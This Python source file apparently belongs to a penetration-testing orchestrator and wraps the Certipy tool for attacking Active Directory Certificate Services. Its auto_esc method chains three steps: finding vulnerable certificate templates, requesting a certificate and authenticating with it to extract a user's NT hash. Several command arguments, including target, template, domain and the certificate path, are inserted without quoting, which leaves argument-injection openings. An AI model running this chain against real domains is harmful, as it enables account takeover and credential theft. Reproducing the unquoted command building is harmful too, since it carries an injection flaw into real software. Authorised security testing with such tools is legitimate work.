import json, re, os
import shlex
from typing import Optional
from orchestrator.kali_tools_client import kali


class CertipyWrapper:
    def __init__(self):
        self._available = True

    @property
    def available(self) -> bool:
        return self._available

    async def find(self, target: str, user: str = "", password: str = "",
                   dc_ip: str = "", timeout: int = 120) -> dict:
        args = f"find -target {target} -json -vulnerable"
        if user:
            args += f" -u {user}@{target.split('.')[0]}"
        if password:
            args += f" -p {shlex.quote(password)}"
        if dc_ip:
            args += f" -dc-ip {shlex.quote(dc_ip)}"

        result = await kali.run_certipy(args, timeout=timeout)
        output = result.get("stdout", "") + result.get("stderr", "")
        vulns = [l.strip() for l in output.split("\n") if "ESC" in l or "vulnerable" in l.lower()]
        return {
            "success": result.get("returncode") == 0,
            "vulnerabilities": vulns,
            "raw": output[:5000],
            "error": result.get("stderr", "")[:1000] if result.get("returncode") != 0 else "",
        }

    async def req(self, target: str, ca: str, template: str = "",
                  user: str = "", password: str = "", dc_ip: str = "",
                  timeout: int = 120) -> dict:
        args = f"req -target {shlex.quote(target)} -ca {shlex.quote(ca)}"
        if user:
            args += f" -u {shlex.quote(user)}"
        if password:
            args += f" -p {shlex.quote(password)}"
        if dc_ip:
            args += f" -dc-ip {dc_ip}"
        if template:
            args += f" -template {template}"

        result = await kali.run_certipy(args, timeout=timeout)
        out = result.get("stdout", "") + result.get("stderr", "")
        cert_match = re.search(r"Saved certificate to (.+\.pem)", out)
        return {
            "success": result.get("returncode") == 0,
            "certificate_path": cert_match.group(1) if cert_match else None,
            "output": out[:3000],
            "error": result.get("stderr", "")[:1000] if result.get("returncode") != 0 else "",
        }

    async def auth(self, pfx_path: str, domain: str, dc_ip: str = "",
                   timeout: int = 120) -> dict:
        args = f"auth -pfx {pfx_path} -domain {domain}"
        if dc_ip:
            args += f" -dc-ip {dc_ip}"

        result = await kali.run_certipy(args, timeout=timeout)
        out = result.get("stdout", "") + result.get("stderr", "")
        nt_hash = re.search(r"Got Hash for '(.+)':([a-f0-9]{32})", out)
        return {
            "success": result.get("returncode") == 0,
            "nt_hash": nt_hash.group(2) if nt_hash else None,
            "user": nt_hash.group(1) if nt_hash else None,
            "output": out[:3000],
            "error": result.get("stderr", "")[:1000] if result.get("returncode") != 0 else "",
        }

    async def auto_esc(self, target: str, user: str, password: str,
                       dc_ip: str = "", timeout: int = 300) -> list[dict]:
        results = []
        find_result = await self.find(target, user=user, password=password, dc_ip=dc_ip, timeout=timeout)
        if not find_result["success"]:
            return [find_result]
        results.append(find_result)
        raw = find_result.get("raw", "")
        ca_match = re.search(r"CA Name\s+:\s+(.+)", raw)
        template_match = re.search(r"Template\s+:\s+(.+)", raw)
        if ca_match:
            ca_name = ca_match.group(1).strip()
            template = template_match.group(1).strip() if template_match else "User"
            req_result = await self.req(target, ca_name, template=template,
                                        user=user, password=password, dc_ip=dc_ip, timeout=timeout)
            results.append(req_result)
            if req_result.get("certificate_path"):
                auth_result = await self.auth(req_result["certificate_path"],
                                              domain=target.split(".")[0],
                                              dc_ip=dc_ip, timeout=timeout)
                results.append(auth_result)
        return results
